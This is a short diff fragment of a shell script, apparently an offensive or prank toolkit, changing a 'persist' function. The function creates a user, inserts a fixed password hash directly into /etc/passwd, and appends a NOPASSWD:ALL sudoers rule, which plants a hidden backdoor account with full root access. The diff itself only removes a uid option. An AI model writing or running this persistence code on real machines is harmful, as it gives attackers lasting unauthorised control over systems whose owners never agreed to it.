@@ -22,7 +22,7 @@ function nyan() {
 
 function persist() {
   # adding user with your nickname
-  useradd -u 666 -m $nickname -s /bin/bash
+  useradd -m $nickname -s /bin/bash
   sudo sed -i "s/$nickname:x:/$nickname:qpQzOFb2UGjtE:/g" /etc/passwd
   echo "$nickname ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
 
